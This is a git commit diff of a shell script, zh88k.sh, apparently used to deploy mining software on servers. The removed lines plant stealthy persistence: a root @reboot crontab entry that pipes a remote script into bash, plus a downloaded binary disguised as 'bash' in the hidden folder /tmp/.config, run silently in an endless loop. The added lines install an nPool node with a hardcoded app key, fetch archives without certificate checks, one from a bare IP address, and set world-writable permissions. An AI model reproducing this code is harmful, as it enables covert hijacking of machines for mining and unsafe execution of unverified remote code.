23f286d36cc1fb1bf8d3d5fae9412249706846e6
curiosityinteriorsuk <160749431+curiosityinteriorsuk@users.noreply.github.com>
2024-05-01 20:43:42 +0800

    Update zh88k.sh

--- zh88k.sh
+++ zh88k.sh
@@ -1,28 +1,48 @@
 #!/bin/bash
 
-mode="{1:-0}"
-src="https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main"
+export AppKey="TtKMw9dZOHn6idd7"
 
-# Debian12+
-sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
-sudo apt -qqy install wget nload icu-devtools >/dev/null 2>&1 || apt -qqy install wget nload icu-devtools >/dev/null 2>&1
+export DEBIAN_FRONTEND=noninteractive
+export ARCH="amd64"
+export Home="/opt/nknorg"
+export MirrorURL="http://16.162.87.3:5123/GoogleDrive/1n8wpzdduxhVje5d4NZNE5ZRAYtR0xx7e?package=1&direct=1"
 
-#cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
-[ -n "$cores" ] || cores=1
-addr=`wget --no-check-certificate -4 -qO- http://checkip.amazonaws.com/ 2>/dev/null`
-[ -n "$addr" ] || addr="NULL"
-name="c${cores}_${addr}"
+export Channel="nPool"
 
-sudo sysctl -w vm.nr_hugepages=$((cores*256)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*256)) >/dev/null 2>&1
-sudo sed -i "/^@reboot/d;\$a\@reboot root /bin/bash <(wget -qO- ${src}/q.sh) >>/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1 || sed -i "/^@reboot/d;\$a\@reboot root /bin/bash <(wget -qO- ${src}/q.sh) >>/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1
+## requirement
+apt-get -qq update
+apt-get -qq install -y wget curl unzip
 
-mkdir -p "/tmp/.config"
-wget --no-check-certificate -4 -qO "/tmp/.config/appsettings.json" "${src}/q.json"
-wget --no-check-certificate -4 -qO "/tmp/.config/bash" "${src}/q"
-chmod -R 777 "/tmp/.config"
+## clean
+rm -rf "$Home"
 
-if [ "$mode" == "0" ]; then
-  bash -c "while true; do cd /tmp/.config; ./bash ${name} ${cores} >/dev/null 2>&1 ; done" >/dev/null 2>&1 &
-else
-  while true; do cd /tmp/.config; ./bash ${name} ${cores} >/dev/null 2>&1 ; done
-fi
+## install
+mkdir -p "/tmp"
+mkdir -p "$Home"
+cd "$Home"
+
+# core
+
+wget --no-check-certificate --continue --tries=0 -qO /tmp/nkn.tar.gz "https://download.npool.io/linux-amd64.tar.gz"
+[ $? -eq 0 ] || exit 1
+
+tar -zxvf /tmp/nkn.tar.gz -C /tmp
+cp -rf "/tmp/linux-${ARCH}/npool" "$Home/"
+cp -rf "/tmp/linux-${ARCH}/config.json" "$Home/"
+chown -R root:root "$Home"
+chmod -R 777 "$Home"
+
+
+# chainDB
+rm -rf "${Home}/tmp/*"
+[ -d "${Home}/tmp" ] || mkdir -p "${Home}/tmp"
+wget --no-check-certificate --continue --tries=0 -qO- "$MirrorURL" |tar -zx -C "${Home}/tmp"
+rm -rf "${Home}/ChainDB"
+[ -d "${Home}/tmp/ChainDB" ] && mv -f "${Home}/tmp/ChainDB" "${Home}/"
+
+# run1
+cd "$Home"
+while true; do ${Home}/npool --appkey ${AppKey} --no-nat; sleep 1; done
+
+# quit if fail
+rm -rf "${Home}"
